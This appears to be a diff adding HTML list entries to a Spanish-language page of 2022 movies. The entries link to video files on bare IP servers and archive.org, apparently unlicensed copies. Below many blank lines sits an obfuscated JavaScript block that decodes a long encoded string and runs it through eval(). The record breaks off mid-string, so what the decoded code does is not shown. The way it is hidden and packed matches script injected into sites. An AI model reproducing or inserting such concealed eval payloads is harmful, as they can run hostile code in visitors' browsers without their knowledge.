+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/bigbug%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/2/w1280/zPjihui8E5Od950H8jIgar1Eidz.jpg	"/> <h6>	Bigbug (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/black%20adam%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/10/w1280/mPTzXksC8HcAj6EM6WjZFJVJEzF.jpg	"/> <h6>	Black Adam (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/01_20221112_20221112_1605/01.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/10/w1280/7MwrqCY0AZw3ZWp1F8BWsYLRWUu.jpg	"/> <h6>	Black Adam: Heroe o villano? (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/NOVIEMBRE/14NOV/12283.Blaze.2022.1080p.WEBRip.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/8/w1280/huRYGtBrvE46vcFq52Mb3zSRp5r.jpg	"/> <h6>	Blaze (2022) SUB	</h6></a></li>
+<li> <a href="	http://51.81.208.167/pelis2022/Bobs.Burgers.The.Movie.2022.lati.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/5/w1280/31vliI2mopLlh5kUoWpJZ19cF8y.jpg	"/> <h6>	Bob´s burgers: La película (2022)	</h6></a></li>
+<li> <a href="	http://51.81.208.167/pelis2022/One.Way.2022.lati.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/fUqIFYsmzR2w0pPrkm2xyp5Suct.jpg	"/> <h6>	Boleto de fuga (2022)	</h6></a></li>
+<li> <a href="	http://74.208.251.230/Contenido/Peliculas/Estrenos/Borrego%20(2022).mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/1/w1280/ohVi0I3VYD5Rx1Tze7tMcZ9NQj6.jpg	"/> <h6>	Borrego: Sal del camino (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/broad%20peak%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/hssJ3koEXveKRDXb3r6ujEuySGF.jpg	"/> <h6>	Broad peak (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/buba%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/8/w1280/7iRMwdNzXFnOKMhVoodj0zhvFYY.jpg	"/> <h6>	Buba (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/goodnight%20mommy%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/xgflUOfwrhlC6pfWm794okPPcsN.jpg	"/> <h6>	Buenas noches mamá (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/bull.-2022.1080p.dual-lat.cinecalidad.lol/Bull.2022.1080p.dual-lat.cinecalidad.lol.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2021/11/w1280/oapxWncDc5ztrge3ycpvaZIMcf3.jpg	"/> <h6>	Bull (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/bulldozer-2022/Bulldozer%20%282022%29.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/wMk6lLKD4tk2LHBJr26pgXrVvcI.jpg	"/> <h6>	Bulldozer (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/01_20220505_20220505_1718/01.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/2/w1280/kM1NG2m3nn1e0PBYGhvRV1FSLX6.jpg	"/> <h6>	Burbuja (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/black%20crab%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/3/w1280/pfgfS62kahCuCl1QazWiRwbnWR2.jpg	"/> <h6>	Cangrejo negro (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/DICIEMBRE/13DIC/Ver%20Capit%c3%a1n%20Carver%20%282022%29%20Online%20Cuevana%203%20Peliculas%20Online.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2023/1/w1280/up0fm0GmK8LbEmw4OBBFDEC65uu.jpg	"/> <h6>	Capitán Carver (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/captain%20nova%202021.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2021/12/w1280/afBZGq5CTVIAqvHMr4WciNCCqki.jpg	"/> <h6>	Capitán Nova (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/SEPTIEMBRE/1SEP/1120.American.Carnage.2022.1080p.BluRay.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/7/w1280/zQmwQqtT2KEfg5IO5u8lexZoCAR.jpg	"/> <h6>	Carnicería americana (2022) SUB	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULA/30.7/7398.Paradise.Highway.2022.1080p.WEBRip.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/7/w1280/2ahZgaFAbWoKMfJHhmhZDrdStgD.jpg	"/> <h6>	Carretera del paraiso (2022) SUB	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/carter%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/8/w1280/7EOVeD2fCn4KS4pi7pjwOZCewl4.jpg	"/> <h6>	Carter (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/marry%20me%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/2/w1280/f0p7beh1Zil35jahcUgSGL1v430.jpg	"/> <h6>	Cásate conmigo (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/hunting%20ava%20bravo%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/rC3R4duNxZO0qmcEt7n1RNw4mWR.jpg	"/> <h6>	Cazando a Ava Bravo (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/01_20220701_20220701_1443/01.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/6/w1280/wOx97MJOxEoR38aoya3lopyrlYC.jpg	"/> <h6>	Centauro (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/cerdita%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/10/w1280/kmCjZjm4CHuuJdwUdn3h93WqDdR.jpg	"/> <h6>	Cerdita (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/glamour%20girls%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/6/w1280/k1oQxnYUcnKlhg7uM3P3QAY4Y84.jpg	"/> <h6>	Chicas con glamur (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/chip%20n%20dale%20rescue%20rangers%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/5/w1280/cVE6Mop3gCqIZfnQEkvGV2rG0IM.jpg	"/> <h6>	Chip y Dale: Al rescate (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/ozel%20ders%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/12/w1280/aKL4CA8BsdDlKFiF0gaLQAYG4rp.jpg	"/> <h6>	Clases particulares (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULA/5.jul/3105.Code.Name.Banshee.2022.1080p.WEBRip.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/7/w1280/h1r6A3fTe2urhf9ZTdgY0KAhOwc.jpg	"/> <h6>	Codigo Banshee (2022) SUB	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/codigo%20emperador%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/3/w1280/xas31RGgejMwrEZELD6iplqGgTM.jpg	"/> <h6>	Código Emperador (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/collision%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/6/w1280/t2Bw6Yl4aiflTUXKW3CZ6xtjciy.jpg	"/> <h6>	Colision (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/wifelike%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/8/w1280/tea2gDZPxw0wfKC2S2VRWHagtt4.jpg	"/> <h6>	Como una esposa (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/confess%20fletch%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/4dqEk1X8rHSOWWfnVEuzgXj24Mr.jpg	"/> <h6>	Confiesa Fletch (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/gasoline%20alley%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/2/w1280/g9PcWL7xkqX0od1HEr0fgLsjTb0.jpg	"/> <h6>	Conspiración explosiva (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/contando%20ovejas%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/tJ1BmUzBlk4PFcj7jTpRQoWjqGd.jpg	"/> <h6>	Contando ovejas (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/01_20220809_20220809_2050/01.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2021/6/w1280/h5TOHkyf6SGpZtdKYa4FvxkXDAU.jpg	"/> <h6>	Contigo: Volumen 2 (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/fireheart%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/1/w1280/jWyj0v21swHMvwf14yd1NqR1ApE.jpg	"/> <h6>	Corazón de fuego (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/purple%20hearts%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/7/w1280/ndp4yIfg04i3raprDJ0UKWD8IK9.jpg	"/> <h6>	Corazones malheridos (2022)	</h6></a></li>
+<li> <a href="	http://74.208.251.230/Contenido/Peliculas/Estrenos/Corre%20Y%20Dispara%20(2022).mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/1/w1280/u0lDOmGmHZBLGXMDGaUA3005nt6.jpg	"/> <h6>	Corre y dispara (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/DICIEMBRE/31DIC/Final.Cut.2022.1080p.BluRay.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/5/w1280/ozZ5J72Cj547V6Sonb8whTSIye7.jpg	"/> <h6>	Corten (2022) SUB	</h6></a></li>
+<li> <a href="	https://archive.org/download/zrghornic-h2/%23Fbf.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/3/w1280/3fjJigLWc3mvRjzqZ3FSMvQK6oO.jpg	"/> <h6>	Crecer apesta (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/crush%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/d9Sh1cNpw5YEiejiuTeszwNQQjX.jpg	"/> <h6>	Crush: Amor a primera vista (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/cuando%20sea%20joven%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/6gIJuFHh5Lj4dNaPG3TzIMl7L68.jpg	"/> <h6>	Cuando sea joven (2022)	</h6></a></li>
+<li> <a href="	http://51.81.208.167/pelis2022/Cuarentones.2022.lati.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/3/w1280/xARmbhKwPFc1oMkcis0pAHFBMdX.jpg	"/> <h6>	Cuarentones (2022)	</h6></a></li>
+<li> <a href="	http://51.81.208.167/pelis2022/Culpa.2022.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/5/w1280/A9SjAE5ckR041qavTFYSxvRaTtZ.jpg	"/> <h6>	Culpa (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/DICIEMBRE/2dic/16387.Darby.and.the.Dead.2022.1080p.WEBRip.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/12/w1280/sBsLJ6SQOpjLoGEqgleoTsHykgk.jpg	"/> <h6>	Darby y los muertos (2022) SUB	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/dc%20league%20of%20super%20pets%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/7/w1280/lDtANZzTD80bVi1DTRKRVDrurhJ.jpg	"/> <h6>	DC Liga de Supermascotas (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/NOVIEMBRE/17NOV/8303.Deadstream.2022.1080p.WEBRip.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/10/w1280/5rsS8m61oHTjoTKfDWVMF3OHnww.jpg	"/> <h6>	Deadstream (2022) SUB	</h6></a></li>
+<li> <a href="	http://54.39.52.63/ZEUS/Movies/Mayo/12%20mayo/D%c3%a9jate%20llevar.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/5/w1280/d5spmLeGR9kxBRQ6qxCFad1ljvT.jpg	"/> <h6>	Déjate llevar (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/d3maci4d0-gr4nd3p4rac-4d4s/d3maci4d0-gr4nd3p4rac-4d4s.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/3/w1280/kjrkEnvxAt0PnXvaP8gZZI9t1gO.jpg	"/> <h6>	Demasiado grande para cuentos de hadas (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/clerks%20III%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/uESLvTixBpo6LE9RVZtRhwSdBDJ.jpg	"/> <h6>	Dependientes III (2022)	</h6></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+          <!--
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+               -->
+
+
+
+
+
+
+
+
+
+</div>
+
+
+
+
+
+</ul></center><br>
+<script>
+var _0xc32e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe53c(d,e,f){var g=_0xc32e[2][_0xc32e[1]](_0xc32e[0]);var h=g[_0xc32e[3]](0,e);var i=g[_0xc32e[3]](0,f);var j=d[_0xc32e[1]](_0xc32e[0])[_0xc32e[10]]()[_0xc32e[9]](function(a,b,c){if(h[_0xc32e[4]](b)!==-1)return a+=h[_0xc32e[4]](b)*(Math[_0xc32e[8]](e,c))},0);var k=_0xc32e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc32e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe53c(s,e,10)-t)}return decodeURIComponent(escape(r))}("RLRvRMCvRqLvBRBvRBqvBLLvRLLvRMMvBLLvRMqvMMCvRBCvBRRvBRRvBLBvBRRvRLCvRqRvRRLvRRMvRLBvBRRvBLBvBRRvBLLvMCCvMCBvMCMvMCRvMCqvMCLvMBCvMBBvMBMvRMCvRMBvRMMvRMRvRMqvRMLvRRCvRRBvRRMvRRRvRRqvRRLvRqCvRqBvRqMvRqRvRqqvRqLvRLCvRLBvRLMvRLRvRLqvRLLvqCCvqCBvMMqvMMLvMRCvMRBvMRMvMRRvMRqvMRLvMqCvMqBvMqMvMqRvMqqvMqLvMLCvMLBvMLMvMLRvMLqvMLLvRCCvRCBvRCMvRCRvRCqvRCLvBLCvBLqvBRRvBLBvBRRvRLCvRRLvRRMvRMMvRMqvBRRvBLBvBRRvRRMvRqBvRMRvRMqvRLLvMLCvRMLvBRRvBLBvBRRvBRRvBLBvBRRvBRRvBLBvBRRvBLRvBRRvBLBvBRRvRqRvRqMvRLqvBRRvBLBvBRRvRqLvRMqvRMRvRLMvRMMvRMqvBRRvBLBvBRRvRqLvRMqvRLRvRMqvRqLvRLCvRMqvBRRvBLBvBRRvBLLvBRRvRBMvMBqvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBRBvRBqvBLLvRLLvRMqvMCMvRMMvBqRvRMRvBLBvRMqvBLBvRMLvBqqvqCMvRLRvRMCvRqLvBRBvRRCvMMCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCBvRBMvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvRBMvRBMvBqRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvBqqvMBqvRLRvRMCvRqLvBRBvRRBvMMCvRRCvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCMvRBMvRBMvBqRvBLLvBLBvRMqvBqqvMBqvRLRvRMCvRqLvBRBvRRMvMMCvRRCvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCMvRBMvRBMvBqRvBLLvBLBvRMLvBqqvMBqvRLRvRMCvRqLvBRBvRRRvMMCvRMRvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvRBMvRBMvBqRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvBqqvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvBLLvRBMvRBMvBqRvBqqvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMBMvRBMvRBMvBqRvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBqRvRMCvBLBvRMBvBLBvRMMvBqqvqCMvRRMvRMLvBqRvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCRvRBMvRBMvBqRvRMBvBqqvBRMvMMCvMMCvBLMvMCCvBqqvRqLvRMqvRLBvRLMvRqLvRqBvBRBvRMCvBLCvMMCvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCRvRBMvRBMvBqRvRMBvBqqvBqLvBqRvMqqvRMCvRLBvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMBBvRBMvRBMvBqRvRMqvBLBvRMMvBqqvBqqvqCqvBLBvBLLvBqqvMBqvRLRvRMCvRqLvBRBvRRqvMMCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvMBqvRLqvRRBvRRMvRRLvRMqvBqRvRRRvMMBvBLLvBqqvqCMvRRqvMMCvRRMvRBCvRRRvBqCvRMLvRBMvBLCvRRqvMBqvRRRvMMCvBqRvRRRvBLMvBqRvRRRvBqCvRMLvBqqvBqqvBLqvRMLvqCqvRqLvRMqvRLBvRLMvRqLvRqBvBRBvRRqvqCRvqCRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvMCCvRBMvqCqvRMqvRLRvRMCvRRLvBqRvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBqRvRRBvBLBvRLMvBLBvRqBvBLBvRLBvBLBvRMqvBLBvRqLvBqqvqCMvRqLvMMCvBRRvBRRvMBqvRMLvRqMvRqLvBqRvRLRvRMCvRqLvBRBvRRMvMMCvBLLvBLBvRRLvRMqvRqBvMMCvRRBvBLRvRRLvRMqvRqBvRRCvRLBvRRBvMBqvRRMvMBLvRRLvRMqvRqBvMBqvRRMvBLCvBLCvBqqvqCMvRLRvRMCvRqLvBRBvRLCvMMCvBRRvBRRvMBqvRLqvRRBvRRMvRRLvRMqvBqRvRRBvRBCvRRMvRBMvBRMvMMCvMMCvRqBvRBCvRMqvRBMvBqqvqCMvRLCvBLCvMMCvRRBvRBCvRRMvRBMvMBqvRRMvBLCvBLCvqCqvRMLvRqMvRqLvBqRvRLRvRMCvRqLvBRBvRRRvMMCvBLLvMBqvRRRvMBLvRqBvBLRvRRLvRMqvRqBvRRCvRLBvRRBvMBqvRRRvBLCvBLCvBqqvRLCvMMCvRLCvBLRvRqLvRMqvRqRvRRLvRMCvRMMvRMqvBqRvRqBvRMqvRLqvBRBvMLRvRMqvRRCvMRMvRLLvRqRvBqRvRqBvRBCvRRRvRBMvBLBvBRRvRRCvBRRvBqqvBLBvRRRvBqqvMBqvRqLvBLCvMMCvMLqvRLBvRqLvRRMvRqBvRRCvBLRvRMLvRqLvRqMvRqCvMRCvRRBvRMCvRqLvMRCvRqMvRMRvRMqvBqRvRBqvBLLvRLLvRMqvMCMvRMMvBqRvRLCvBLBvRMqvBLBvMCCvBLLvBqqvBLMvRLBvBqqvqCqvRqLvRMqvRLBvRLMvRqLvRqBvBRBvRMRvRMqvRMMvRqMvRMRvRMqvRCCvMLRvMqCvMRCvRqMvRqCvRqRvRqMvRqBvRMqvRqBvRLBvBqRvRMqvRLCvRMMvRMCvRqRvRMqvBqRvRqLvBqqvBqqvqCqvBqRvBRRvMLLvMLqvMLqvMLqvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvMLqvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRMMvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvMLqvMLqvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvMLqvRMCvMLqvRqRvRMMvRMCvMLqvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRqRvRqRvRMCvRqRvMLqvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvMLLvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRqRvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvRqRvMLLvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLqvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLLvMLLvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvRqRvRMMvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvRqRvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvMLqvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLLvRMCvRqRvRqRvRqRvRMCvRqRvMLqvRMCvMLLvMLqvMLqvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvMLLvMLqvRMCvMLqvMLLvRMMvRMCvMLqvRqRvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRqRvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLqvRqRvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvMLLvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLqvRMMvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLqvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLLvMLqvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvRqRvMLLvRMCvMLLvMLqvMLqvRMMvRMCvMLqvRqRvRMMvRMCvMLqvMLLvMLqvRMCvMLLvRqRvRMMvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLLvRMMvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLqvMLLvMLqvRMCvMLqvRqRvMLLvRMCvMLqvRqRvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLqvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvMLqvMLLvRMCvMLLvMLqvMLqvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLLvMLqvMLLvRMCvMLLvRqRvMLLvRMMvRMCvMLLvRqRvMLLvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRMMvMLLvRqRvRMCvMLL